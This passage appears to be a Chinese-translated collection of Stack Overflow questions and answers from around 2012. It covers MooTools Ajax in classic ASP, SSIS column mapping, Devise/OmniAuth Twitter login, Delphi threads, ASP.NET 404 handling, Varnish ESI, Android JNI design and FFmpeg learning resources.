     var myFx=new Fx.Tween($('DOB'));
     myFx.set('color', '#cc0000');
   } 
```

Ajax 脚本和调用：

```
 <script language="javascript"> 
    window.addEvent('domready', function() { 
      $('ZK').addEvent('click', function(event) { 
        event.stop(); 
        var req = new Request.HTML({ 
          method: 'post', 
          url: '../ajax/a_bsn.asp',
          data: {
            'BSN':$('BSN').get('value'), 
            'DOB':$('DOB').get('value'),
            'RequestType':'WWW',
            'RXID':'<%=GUID%>'
          }, 
          update: $('RES'),
          onRequest: function() {
            $('RES').innerHTML = '<img width="16px" height="16px" src="../images/spinner.gif"/>';
    }}).send(); 
  });

////////
<%  If (Len(BSN)=8 or Len(BSN)=9) and IsNumeric(BSN) and Len(DOB)=8 and IsNumeric(DOB) Then %>
if ($('BSN').get('value').length>7){
  var myFx=new Fx.Tween($('BSN'));
  myFx.set('color', '#000066');
} else {
  var myFx=new Fx.Tween($('BSN'));
  myFx.set('color', '#cc0000');
}
if ($('DOB').get('value').length==8 && $('DOB').get('value')!='ddmmjjjj'){
  var myFx=new Fx.Tween($('DOB'));
  myFx.set('color', '#000066');
  // var $zk = $('ZK'); console.log($zk); $zk.click();
  // alert('Uw gegevens worden ingevuld.');
  setTimeout("$('ZK').click();",1);
  //$('ZK').click();
} else {
  var myFx=new Fx.Tween($('DOB'));
  myFx.set('color', '#cc0000');
}
<%  End If %>
////////
});
</script> 
```

受 Ajax 影响的 Div

```
<DIV id="RES">      
<INPUT TYPE="TEXT" ID="PNAAM" onkeypress="return noenter()"  NAME="PNAAM" VALUE="<%=PNAAM%>" class="text_inv" style="width:375px">
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:25:29.307

在您进行编辑后，我最初的答案不再有意义。

**编辑 ：**

您的单击处理程序和 ajax 调用包含在`domready`事件处理程序函数中。您的“呼叫脚本”也应该准备就绪。根据您的最新编辑，`domready`处理程序在 ASP 标记之前关闭`<%`

这是您发布的内容：

```
 }).send();  // --this is the end of ajax
    }); // -- this is the end of the click handler
}); // -- this is the end of domready
<%  If (Len(BSN)=8 
```

所以你的调用脚本：

```
if ($('DOB').get('value').length==8 && $('DOB').get('value')!='ddmmjjjj') {
    var myFx=new Fx.Tween($('DOB')); myFx.set('color', '#000066');
    //alert();
    $('ZK').click();
} else { var myFx=new Fx.Tween($('DOB')); myFx.set('color', '#cc0000'); } 
```

`domready` **附加点击处理程序后**需要进入：

```
window.addEvent("domready", function(){
    // Let's attach the click handler:
    $('ZK').addEvent('click', function(event) {...do the ajax here etc...});

   // the "call script" needs to be here

}); 
```

您需要等待文档结构加载。

顺便说一句，如果您停止在问题中移动代码，这将有所帮助 - 只需发布您当前使用的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:49:18.420

最有可能的是，在其他错误中，您有一个未以分号结尾的语句。尝试删除`alert()`并让`;`测试。此外，如果您还没有，请检查您的控制台，因为您应该会看到*至少*1 个错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-10T07:10:30.920

我们的首席程序员（最初是在大约 8 年前制作了这个页面）认为将所有逻辑移到函数中可能会更好。这样，如有必要，它们可以在代码的其他部分更容易地触发。我们还删除了所有（旧）内联脚本。

在此解决方案中，使用了其他答案的某些部分。我要感谢其他回答者和评论者的帮助。

代码的顶部现在看起来像这样（经过测试并在浏览器中稳定运行）：

```
 function updateName(){
        if (document.id('BSN').get('value').length>7 && document.id('DOB').get('value').length==8 && document.id('DOB').get('value')!='ddmmjjjj'){
            var req = new Request.HTML({
                method: 'post',
                url: '../ajax/a_bsn.asp',
                data:{'BSN':document.id('BSN').get('value'),'DOB':document.id('DOB').get('value'),'RequestType':'WWW','RXID':'<%=GUID%>'},
                update: document.id('RES'),
                onRequest: function() {
                    document.id('RES').innerHTML = '<img width="16px" height="16px" src="../images/spinner.gif"/>';
                }
            }).send();
        }
    }
    function checkBSN(){
        if (document.id('BSN').get('value').length>7){
            var myFx=new Fx.Tween(document.id('BSN'));
            myFx.set('color', '#000066');
            updateName();
        } else {
            var myFx=new Fx.Tween(document.id('BSN'));
            myFx.set('color', '#cc0000');
        }
    }
    function checkDOB(){
        if (document.id('DOB').get('value').length==8 && document.id('DOB').get('value')!='ddmmjjjj'){
            var myFx=new Fx.Tween(document.id('DOB'));
            myFx.set('color', '#000066');
            updateName();
        } else {
            var myFx=new Fx.Tween(document.id('DOB'));
            myFx.set('color', '#cc0000');
        }
    }
    window.addEvent('domready', function() {
        document.id('ZK').addEvent('click', function(event) {
            event.stop && event.stop();
            updateName();
        });
        document.id('BSN').addEvent('keyup', function(event) {
            event.stop && event.stop();
            updateName();
        });
        document.id('DOB').addEvent('keyup', function(event) {
            event.stop && event.stop();
            updateName();
        });
    <%  If (Len(BSN)=8 or Len(BSN)=9) and IsNumeric(BSN) and Len(DOB)=8 and IsNumeric(DOB) Then %>
        updateName();
    <%  End If %>
    }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T15:44:20.730

重用你的函数、选择器和变量...

```
window.addEvent('domready', function() {

    var ZK = $('ZK');
    ZK.addEvent('click', function(event) { 
        // make event safe and reusable via software call
        event.stop && event.stop(); // don't call stop if not a real event.

        // logic here

    });

    $('DOB').addEvent('keyup', function() {
        // this == DOB
        var value = this.get('value'); // get it once.

        if (value.length && value.length === 8 && value !== 'ddmmjjjj') {
            // do not call click! we can now fireEvent
            ZK.fireEvent('click'); 
        }
    });
}); 
```

不要使用内联js。不要依赖 $，`document.id`而是使用 mootools 1.2.4+

回顾一下，不要去 dom 做合成`.click()`——它不是最可靠的，你也不需要。

# ssis - 动态列映射

> ID：11396231
> 
> 赞同：0
> 
> 时间：2012-07-09T13:40:27.423
> 
> 标签：ssis

我在 2 个 excel 文件中有源数据。这两个 excel 文件中的数据应加载到同一个事实表中。excel文件和表格中的列名不一样。我有一个参考表，其中包含 excel 和事实表之间的列映射。我必须参考此参考表以获取列映射，另外我必须添加一些派生列 (Created_Date) 以加载 Fact_Table。

我在下面给出了一个示例数据结构：

源数据

```
Excel1_Order.xls
OrderNumber     OrderQuantity     OrderDate
Order10001      100        01-01-2011

Excel2_Customer.xls
CustomerNumber      CustomerName     CustomerAddress
Customer0001        CCPrivateLtd     India

ReferenceTable
Category      DestinationColumn        SourceColumn
Order         Disp_Col_1               OrderNumber
Order         Disp_Col_2               OrderQuantity
Order         Disp_Col_3               OrderDate
Customer      Disp_Col_1               CustomerNumber
Customer      Disp_Col_2               CustomerName 
Customer      Disp_Col_3               CustomerAddress

DestinationTable
Category        Disp_Col_1     Disp_Col_2     Disp_Col_3    Created_Date
Order           Order10001     100            01-01-2011    getdate()
Customer        Customer0001   CCPrivateLtd   India         getdate() 
```

有什么办法可以在 SSIS 中处理这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T19:31:41.823

通常我会创建两个数据流并让文件名决定使用哪一个。

# ruby-on-rails-3 - 身份验证失败：设计 + OmniAuth + Twitter

> ID：11396233
> 
> 赞同：7
> 
> 时间：2012-07-09T13:40:33.410
> 
> 标签：ruby-on-rails-3, twitter, devise, omniauth

成功`(twitter) Authentication failure! invalid_credentials: OAuth::Unauthorized, 401 Unauthorized`登录推特后出现错误，页面被重定向到登录页面

这是应用程序配置

**路线.rb**

```
devise_for :users, :controllers => { :omniauth_callbacks => "users/omniauth_callbacks" } 
```

**设计.rb**

```
config.omniauth :twitter, "KEY", "SECRET" 
```

**omn​​iauth_callbacks_controller.rb**

```
class Users::OmniauthCallbacksController < Devise::OmniauthCallbacksController  
  def twitter
    auth = env["omniauth.auth"]
    Rails.logger.info("auth is **************** #{auth.to_yaml}")
    @user = user = User.find_by_provider_and_uid(auth["provider"], auth["uid"]) || User.new
    if @user.persisted?
      flash[:notice] = I18n.t "devise.omniauth_callbacks.success"
      sign_in_and_redirect @user, :event => :authentication
    else
      session["devise.twitter_uid"] = auth["uid"]
      redirect_to new_user_registration_url
    end
  end
end 
```

**用户.rb**

```
class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable, :omniauthable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me, :provider, :uid
  # attr_accessible :title, :body
end 
```

**index.html.erb**

```
<h3>Home</h3>

<%if user_signed_in? %>
  <div><%="Welcome #{current_user.email}"%></div>

<div><%=link_to "Logout", destroy_user_session_path, method: :delete%></div>

<%else%>
<div><%=link_to "Sign in twitter", user_omniauth_authorize_path(:twitter)%></div>
<%end%> 
```

**控制台日志**

```
Started GET "/users/auth/twitter" for 127.0.0.1 at 2012-07-09 18:58:16 +0530
(twitter) Callback phase initiated.
(twitter) Callback phase initiated.
(twitter) Authentication failure! invalid_credentials: OAuth::Unauthorized, 401 Unauthorized

Started GET "/users/auth/twitter/callback?oauth_token=rLCEqgAWPtoIzce475sacKwoqU5baEdz0JnmldXE&oauth_verifier=xYPoz2LZGHQlmz4akoVGkarPtZTebCOmeWzPUqLcPA" for 127.0.0.1 at 2012-07-09 18:58:48 +0530
Processing by Users::OmniauthCallbacksController#failure as HTML
  Parameters: {"oauth_token"=>"rLCEqgAWPtoIzce475sacKwoqU5baEdz0JnmldXE", "oauth_verifier"=>"xYPoz2LZGHQlmz4akoVGkarPtZTebCOmeWzPUqLcPA"}
Redirected to http://localhost:3000/users/sign_in 
```

**dev.twitter.com 中的回调 URL** 之前是`http://127.0.0.1:3000`. 从[Devise、Omniauth 和 Twitter](https://stackoverflow.com/q/7086970/517483)我将其更改为`http://127.0.0.1:3000/auth/twitter/callback`但仍然出现错误

有人可以在这里帮忙解决这个问题吗？

谢谢，阿米特帕特尔

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-07-11T06:29:28.600

我发现了这个问题。`devise.rb`我在和中都配置了提供程序`omniauth.rb`。我只是删除了omniauth.rb，它就开始工作了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-10T03:16:32.280

尝试将您的 twitter KEY 代码放在您的 initilizers 文件夹中的 omniauth.rb 文件中。像这样：

```
Rails.application.config.middleware.use OmniAuth::Builder do
  provider :twitter, 'KEY', 'SECRET'
end 
```

per: [https://github.com/intridea/omniauth](https://github.com/intridea/omniauth)推特的身份验证，毕竟是通过omniauth，而不是设计。

祝你好运！@thatdankent

# delphi - 如何让 TThread 继续在后台工作并在 Listbox 中显示结果？

> ID：11396234
> 
> 赞同：2
> 
> 时间：2012-07-09T13:40:37.940
> 
> 标签：delphi, tthread

我必须开发一个程序来根据我给出的 Select 语句继续观察数据库中的值

监视的值可以随时更改，我的程序必须根据我给出的 select 语句的结果来感知更改

我想通过使用 TThread 来查看选择结果，因为我的系统还具有其他功能，并且用户需要对其进行处理，而不仅仅是查看值。

如何在 Delphi XE2 中使用 TThread

我正在使用 VCL ...没有 .Net

问候。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-10T07:52:19.360

[编辑]

改进的答案，现在线程连续运行并“保持观察值”。

让我们构建一个示例。

首先，创建新的 VCL 应用程序。在窗体上放置一个 TListBox 和两个 TButton 组件。您需要编写按钮单击处理程序并添加一种私有方法。整个单元应如下所示：

```
unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Unit2;

type
  TForm1 = class(TForm)
    ListBox1: TListBox;
    Button1: TButton;
    Button2: TButton;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  private
    { Private declarations }
    FCollector: TCollector;
    procedure OnCollect(S: TStrings);
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.Button1Click(Sender: TObject);
begin
  if Assigned(FCollector) then Exit;
  FCollector := TCollector.Create;
  FCollector.OnCollect := Self.OnCollect;
  FCollector.Start;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  if not Assigned(FCollector) then Exit;
  FCollector.Terminate;
  FCollector := nil;
end;

procedure TForm1.OnCollect(S: TStrings);
begin
  ListBox1.Items.AddStrings(S);
end;

end. 
```

接下来我们应该添加我们的线程，从菜单中选择：文件 -> 新单元并替换为代码：

单元单元2；

```
interface

uses
  System.Classes;

type

  TCollectEvent = procedure (S: TStrings) of object;

  TCollector = class(TThread)
  private
    { Private declarations }
    FTick: THandle;
    FItems: TStrings;
    FOnCollect: TCollectEvent;
    FInterval: Integer;
  protected
    procedure Execute; override;
    procedure DoCollect;
  public
    constructor Create;
    destructor Destroy; override;
    procedure Terminate;
    property Interval: Integer read FInterval write FInterval;
    property OnCollect: TCollectEvent read FOnCollect write FOnCollect;
  end;

implementation

uses Windows, SysUtils;

{ TCollector }

constructor TCollector.Create;
begin
  inherited Create(True);
  FreeOnTerminate := True;
  FInterval := 1000;
  FTick := CreateEvent(nil, True, False, nil);
end;

destructor TCollector.Destroy;
begin
  CloseHandle(FTick);
  inherited;
end;

procedure TCollector.DoCollect;
begin
  FOnCollect(FItems);
end;

procedure TCollector.Terminate;
begin
  inherited;
  SetEvent(FTick);
end;

procedure TCollector.Execute;
begin
  while not Terminated do
  begin
    if WaitForSingleObject(FTick, FInterval) = WAIT_TIMEOUT then
    begin
      FItems := TStringList.Create;
      try
        // Collect here items
        FItems.Add('Item ' + IntToStr(Random(100)));
        Synchronize(DoCollect);
      finally
        FItems.Free;
      end;
    end;
  end;
end;

end. 
```

现在，当您按下 Button1 时，您将收到来自组合中的线程项目。按下 Button2 线程停止执行。

你应该考虑到：

1.  设置Interval为观察值，默认为1000ms，见interval属性；

2.  Execute 中的所有代码（包括数据库访问组件）以及与之相关的代码都应该是线程保存的。

# c# - 发生 404 重定向时如何添加额外的查询字符串参数

> ID：11396235
> 
> 赞同：2
> 
> 时间：2012-07-09T13:40:40.337
> 
> 标签：c#, asp.net, http-status-code-404, custom-error-handling

我们目前正在为我们的 Web 应用程序使用自定义错误页面来处理 404 错误。重定向发生时`aspxerrorpath`包含用户尝试访问的路径。是否可以在 Global.asax 中捕获错误`Application_Error`并在重定向发生之前将新参数附加到查询字符串？我想附加用户请求的主机。

我的理解是 IIS 处理 404 重定向并将`aspxerrorpath`参数附加到 404 重定向，我想在它发生之前拦截它并将另一个参数附加到查询字符串。

**更多信息：**我们在 CMS 中有多个站点，因此请求的 url 并不总是，`www.example.com`但 404 重定向总是 to `www.example.com`。

当前：用户请求`www.example.com/fakepage.aspx`并被重定向到...

```
www.example.com/404.aspx?aspxerrorpath=/fakepage.aspx 
```

我想要什么：用户请求`www.example.com/fakepage.aspx`并被重定向到...

```
www.example.com/404.aspx?aspxerrorpath=/fakepage.aspx&aspxerrorhost=example.com 
```

**解决方案：** 我最终实现了一个自定义 HttpModule（请参阅下面的答案）。我只是想通过一篇优秀的文章来解释如何做到这一点。[http://helephant.com/2009/02/11/improving-the-way-aspnet-handles-404-requests/](http://helephant.com/2009/02/11/improving-the-way-aspnet-handles-404-requests/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:41:23.947

尝试将以下代码放入您的 global.asax 文件中：

```
void Application_Error(object sender, EventArgs e)
{
    string host = Context.Request.Url.Host;
    string redirectUrl = string.Format("~/Error.html?aspxerrorpath={0}&aspxerrorhost={1}", Server.UrlEncode(Context.Request.Path), Server.UrlEncode(host));
    Response.Redirect(redirectUrl);
} 
```

这本质上是创建您自己的错误处理程序以重定向到错误页面，这更加灵活，因为您可以将任何您希望的查询参数添加到 url。

要使用此方法，您将无法以正常方式在 web.config 文件中配置重定向。但是，您可以使用`appSettings`文件的部分，然后读取如下值：

Web.config 文件

```
<appSettings>
  <add key="redirectPath" value="valueGoesHere"/>
</appSettings> 
```

C# 错误处理程序

```
string redirectPath = System.Configuration.ConfigurationManager.AppSettings["redirectPath"]; 
```

编辑：

此外，如果您需要根据 http 错误代码重定向到不同的页面，请在错误处理程序中使用以下代码：

```
HttpException exception = Server.GetLastError() as HttpException;
int errorCode = -1;

if(exception != null)
{
    errorCode = exception.GetHttpCode();
}

switch (errorCode)
{
    case 404:
        // Redirect here
        break;
    default:
        // Redirect here
        break;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T13:45:45.160

为了捕获错误并附加查询，您需要通过继承 IHttpHandler 接口来编写自己的 HttpHandler 并在 ProcessRequest 方法中添加自定义代码

是的，这将适用于所有请求，但可以捕获您之后的请求

请参阅链接了解如何操作：[MSDN](http://msdn.microsoft.com/en-us/library/system.web.ihttphandler.processrequest.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T13:55:28.553

也许使用自定义过滤器属性是解决方案（实现 OnActionExecuted 以检查是否发生错误并修改结果）

# java - JUnit 性能测试 (Contiperf)

> ID：11396238
> 
> 赞同：0
> 
> 时间：2012-07-09T13:40:50.907
> 
> 标签：java, multithreading, performance, junit, contiperf

我目前正在使用我开发的点对点服务应用程序进行一些性能测试。

我对性能测试的经验很少。我找不到像样的指南，我基本上是在随机挑选数字。（即要使用的线程数量）

有人对这个问题有什么建议吗？即有多少线程等。

顺便说一句，我正在使用 contiperf。基于注释的性能测试。这是一个示例测试方法。

```
@Rule
public ContiPerfRule i = new ContiPerfRule();

@Test
@PerfTest(duration = 5000, threads = 10)
@Required(throughput = 50000)
public void test12() throws InterruptedException, FileNotFoundException, CertificateException
{
  nodes.iterator().next().lookup(ee33.getSerialNumber().toString()+ee33.getPublicKey().toString());
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T13:50:30.930

希望您选择的“随机数”并不重要。即，您选择 10 还是 100 并不重要。

我会先从压力测试开始（测试它直到它崩溃），然后基于它创建一个负载测试（在它应该工作的范围内测试它）

# varnish - 在 Varnish 的缓存对象中使用 ESI 标记

> ID：11396239
> 
> 赞同：2
> 
> 时间：2012-07-09T13:40:53.197
> 
> 标签：varnish, esi

我一直在关注这里的指南：[https ://www.varnish-cache.org/docs/trunk/tutorial/esi.html](https://www.varnish-cache.org/docs/trunk/tutorial/esi.html)

到目前为止，我的项目中有两个页面：

1.  `http://127.0.0.1:3001/`（缓存控制：max-age=60，私有）：

    `<b>Cached:</b> <%= Time.now %> <br/>`

    `<b>ESI:</b> <esi:include src="/staticview" /> <br/>`

2.  `http://127.0.0.1:3001/staticview`（缓存控制：max-age=1，私有）：

    `<%= Time.now %>`

但是，每次我请求第一页时，它似乎也会缓存 60 秒的 ESI-include 结果，而不是每秒刷新一次。

**第一个请求：**

```
Cached: 2012-07-09 01:31:12 +0200
ESI: 2012-07-09 01:31:12 +0200 
```

**第二个请求（10 秒后）：**

```
Cached: 2012-07-09 01:31:12 +0200
ESI: 2012-07-09 01:31:12 +0200 
```

**第三个请求（大约一分钟后）：**

```
Cached: 2012-07-09 01:32:19 +0200
ESI: 2012-07-09 01:32:19 +0200 
```

这是预期的行为吗？还是我误解了文档？

我的 VCL 配置如下所示：

```
backend default {
    .host = "127.0.0.1";
    .port = "3000";
}

sub vcl_recv {
    # Don't cache POST, PUT, or DELETE requests
    if (req.request == "POST" || req.request == "PUT" || req.request == "DELETE") {
        return(pass);
    }

    return(lookup);
}

sub vcl_fetch {
    # We want ESI
    set beresp.do_esi = true;

    if (beresp.http.Cache-Control ~ "max-age") {
        unset beresp.http.Set-Cookie;
        return(deliver);
    }

    # Do not deliver into cache otherwise.
    return(hit_for_pass);
}

sub vcl_deliver {
    if (obj.hits > 0) {
        set resp.http.X-Varnish-Cache = "HIT (" +obj.hits+ ")";
    } else {
        set resp.http.X-Varnish-Cache = "MISS";
    }
} 
```

Varnish 使用以下参数运行：

```
varnishd -F -a 127.0.0.1:3001 -f config/varnish/development.vcl 
```

我的 Varnish 版本是这样的（在 Mac OS X 上运行，使用来自 Homebrew repo 的 Varnish）：

```
varnishd (varnish-3.0.2 revision 55e70a4)
Copyright (c) 2006 Verdens Gang AS
Copyright (c) 2006-2011 Varnish Software AS 
```

# c# - if() 中的日期时间

> ID：11396241
> 
> 赞同：0
> 
> 时间：2012-07-09T13:40:59.830
> 
> 标签：c#, wpf, datetime, datagrid

我需要为我的行设置颜色`datagrid`，我使用`loadingrow`事件：

```
DataRowView item = e.Row.Item as DataRowView;
if (item != null)
{
    DataRow row = item.Row;
    var colValue = row[3];
    if (colValue > DATETIME_NOW-10_MINUTES)
    {
        e.Row.Background = (Brush)new BrushConverter().ConvertFrom("#FCD2CD");
    }
} 
```

`colValue`是类型`datetime`是 sql 表。如何设置最后十分钟的颜色行？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T13:43:04.477

您必须从 Row 转换值并使用`DateTime`结构的某些方法（如您需要的 ( `AddMinutes`, `AddHours`, `AddDays`) 并添加一个*负值*以获得`DateTime`过去的 a 。看一看：

```
if (item != null)
{
    DataRow row = item.Row;
    var colValue = (DateTime)row[3];
    if (colValue > DateTime.Now.AddMinutes(-10))
    {
        e.Row.Background = (Brush)new BrushConverter().ConvertFrom("#FCD2CD");
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T13:43:56.097

```
if(colValue > DateTime.Now.AddMinutes(-10))
{
  e.Row.Background = (Brush)new BrushConverter().ConvertFrom("#FCD2CD");
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-09T13:44:23.580

您可以使用 DateTime.Now 获取当前日期/时间并使用 AddMinutes() 添加一些分钟（您可以传递一个负值）

```
colValue > DateTime.Now.AddMinutes(-10) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-09T13:48:18.827

创建一个[自定义值转换器](http://msdn.microsoft.com/en-us/library/system.windows.data.ivalueconverter.aspx)，将日期/时间转换为颜色。这样，您可以将颜色声明性地绑定到模型中的字段，反之亦然。

这更像是 WPF 方式，而不是在后面的代码中强制执行。

# ios - 目标 c 中的内存泄漏问题

> ID：11396243
> 
> 赞同：0
> 
> 时间：2012-07-09T13:41:07.053
> 
> 标签：ios, xcode, memory, memory-leaks, nsdictionary

我一直在与内存泄漏作斗争，比它多一点，它恰好大部分都在同一个位置。我有这个问题，我正在使用一个类来存储代码中所需的全局信息，因为它存储了用户添加到他们的膳食计划中的食物列表。我遇到的问题是，它是我正在使用的一个相对较大的数据结构。数据结构是一个字典，其中包含其他五个字典的键，这些字典都有 8 个可变数组，这些数组可以根据用户的意愿添加，因为可以添加任意多的食物。

我已经设置了这样的结构

```
mealInfo = [[NSMutableDictionary alloc] init]
[mealInfo setObject:[NSMutableDictionary dictionary] forKey:"foo"];
[[mealInfo objectForKey:"such"] setObject: [NSMutableArray array] forKey:"bar"]; 
```

对完整的数据结构重复此操作。当我在 xcode 中进行分析时，这似乎确实解决了我的一些可能的内存泄漏问题。问题更进一步，因为我知道问题不是解决方案。我创建了对象，它在我所在的 .m 文件的本地范围内创建了这个结构。我将这个结构保存在创建 mealInfo 的类中，而不是本地范围内，并使用该类的静态对象。（*我没有使用太多代码，因为它是很多位置中的一个，而两个是太多行*）

在我保存到类的静态变量后，我释放了本地范围，我无法释放 mealInfo，因为当我过去这样做时，它实际上导致对象消失并且在它被初始化的类中为零其他试图访问此信息的类无法访问。

我想到的一个解决方案是让所有的保存和存储都发生在初始化它的类中，并且只使用 getter 和 setter，但试图通过使其成为可以从其他类调用的对象来使其更容易访问并在那些有时变得更加复杂和混乱的类中发生了变化。这是我试图避免的。如果这是唯一的解决方案，我会这样做，但希望首先让这种方法起作用。

我希望这不会太混乱。我也希望有人可以解决这个内存泄漏。谢谢大家至少花时间阅读所有这些。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-06T02:56:34.110

有点难以理解你的问题......但如果`mealInfo`它本身是你的静态类变量，那么你可以通过执行以下操作来分配它一次 - 并且只分配一次。

```
if (!mealInfo)
    mealInfo = [[NSMutableDictionary alloc] init]; 
```

否则每次分配时都必须释放它，否则会泄漏。

# java - Android架构：守护进程或API，JNI与否

> ID：11396246
> 
> 赞同：1
> 
> 时间：2012-07-09T13:41:12.987
> 
> 标签：java, android, architecture, java-native-interface

我需要做的简要说明：我修改了 android 框架并创建了两个应用程序，它们都需要与在用户空间中运行的 C 语言程序进行通信。这个 C 程序基本上是我编写的一个存根，用于与驱动程序和一堆 API 接口。就复杂性而言，它实际上是空的，因为它仅用作隐藏机制的单个入口点，但它有几千行长。

我和我的实习导师对如何做这件事有不同的看法：

1/ 应用程序和修改后的框架（客户端）使用套接字与C程序通信，C程序变成一个守护进程（服务器）。该框架不使用任何 JNI - 而是 java 套接字 - 并且应用程序可能需要继续使用套接字的 JNI 实现（还没有为 .apk 尝试 java 套接字）。这已经过测试可以工作。

2/ 框架和应用程序都调用 C 程序，使用起来有点像库。这意味着 -IMO- 我们要么从 java 中“执行”（错误），要么在 JNI 中实现整个代码（目前为 2000 多行）。

我对此有偏见的看法：1 /

```
+ it's proven to work
+ there is a clear separation between low-level and high-level
+ there might be no JNI usage
+ because I use a C daemon, I can simulate the behaviour on x86 (using an environment provided by the manufacturer)
- architecture is somewhat complex
- depending on whether the .apk can use a java socket or not, the framework and the .apk won't use the exact same mechanisms to
interface with the daemon (java socket and JNI C socket) 
```

2/

```
+ architecture would be simple (with the whole C in the JNI)
- maintaining is going to be a pain
- it's not simulable, development has to either be on target or on emulator
- the android FW has to use JNI (couldn't make this work so far because of a libc error)
- useless use of JNI (from what I understand, should be used for heavy calculations/low-level interfacing) 
```

这样做的正确Android方式是什么？一种方法看起来比它的对应方法更优雅吗？

# adobe-illustrator - 从 Illustrator 导出图像时保持原始大小

> ID：11396247
> 
> 赞同：18
> 
> 时间：2012-07-09T13:41:16.063
> 
> 标签：adobe-illustrator

我使用 Illustrator 为我的应用程序导出`.png`文件，但是当我在 PNG 选项框中选择中 ( `150dpi`) 和高分辨率 ( `300dpi`) 时，它以比我的画板更大的尺寸导出（我的画板是`48px x 48px`并且结果是`56px x 53px`和`112px x 87px`）。如何保存具有画板大小的图像？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-08-05T07:24:25.647

以下列方式导出您的作品：

1\. 勾选“使用画板”，然后保存
2\. 在 png 选项中，使用屏幕 (72ppi)
3\. 现在点击“确定”。

现在您将获得艺术品的实际尺寸。

# c++ - 我在哪里可以找到 C/C++ FFmpeg 扩展教程？

> ID：11396251
> 
> 赞同：11
> 
> 时间：2012-07-09T13:41:20.360
> 
> 标签：c++, c, ffmpeg, video-editing

我想使用 ffmpeg（以其 c 库形式）将视频分割成更多部分，重新​​组合它们并对最终结果进行编码。一些基本的东西。但是很难找到有关此的文档或提示。我应该在哪里寻找/寻求建议？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-26T17:27:38.087

您可以从 FFmpeg 项目维护的命令行实用程序的源代码中学到很多东西。

在**ffplay.c**中，**main()**将向您展示如何初始化库。 **stream_component_open()**演示了将编解码器与媒体中的流匹配，**get_video_frame()**演示了如何解码数据包并获取其 PTS（呈现时间戳）。你需要它来正确地安排你的分裂时间。

这应该让您开始解码方面的工作。在编码方面，请查看**ffmpeg.c**。它比 ffplay 更大更复杂，但编码帧的过程几乎反映了解码它的过程，所以一旦你有解码工作，它应该更有意义。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-05T03:36:03.223

我一直在寻找 FFmpeg 教程和 php，但我发现以下是用任何语言学习它的最佳地点 一本书我认为这是唯一一本关于 FFmpeg FFmpeg 基础知识的书：使用快速音频和视频编码器进行多媒体处理

[http://www.amazon.com/FFmpeg-Basics-Multimedia-handling-encoder/dp/1479327832/ref=sr_1_12?ie=UTF8&qid=1357356672&sr=8-12&keywords=ffmpeg](https://rads.stackoverflow.com/amzn/click/com/1479327832)

![在此处输入图像描述](../Images/7ee14e25aecfd1abb7d29e9d2543770f.png)

第二个地方是 [http://ffmpeg.org/documentation.html](http://ffmpeg.org/documentation.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-04-30T20:28:17.643

我也一直在寻找一个好的 c/c++ FFmpeg 教程，而这个[c/c++ ffmpeg-libav-tutorial](https://github.com/leandromoreira/ffmpeg-libav-tutorial#learn-ffmpeg-libav-the-hard-way)绝对是我迄今为止找到的最好的。它解释了如何将 FFmpeg 用作库，并在此之前对视频关键字（如编码、解码、转译、复用 exc.）进行了清晰的概述，这对不熟悉视频的人非常有帮助。

另外，这个[教程](http://slhck.info/ffmpeg-encoding-course/#/)对于理解视频的概念很有帮助，所以对于视频世界还不够熟悉的朋友，我建议先从这个开始，然后再继续[学习c/c++ ffmpeg-libav-tutorial](https://github.com/leandromoreira/ffmpeg-libav-tutorial#learn-ffmpeg-libav-the-hard-way)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-02-22T10:31:27.117

## **TLDR；**

[https://github.com/ShootingKing-AM/ffmpeg-pseudocode-tutorial](https://github.com/ShootingKing-AM/ffmpeg-pseudocode-tutorial) - 通过松散的伪代码对 ffmpeg-cli 的广泛工作流程理解。

* * *

根据 FFmpeg 开发人员，最好的方法是阅读 ffmpeg libav 和/或 ffmpeg-cli 的源代码。

了解ffmpeg-cli的目的是为了能够将FFmpeg集成到我们的项目中，而无需在后台调用ffmpeg-cli进行多媒体操作。这很重要，因为，

*   启动外部可执行文件往往会被防病毒软件阻止，并可能导致用户出现问题。
*   优化项目特定的 libav 使用并从 ffmpeg-cli 中跳过不必要的代码此外，ffmpeg 官方文档充其量是模糊的，对于希望在其代码中实现 ffmpeg 库 (libav) 功能的开发人员来说，唯一的选择是阅读命令行界面的源代码.

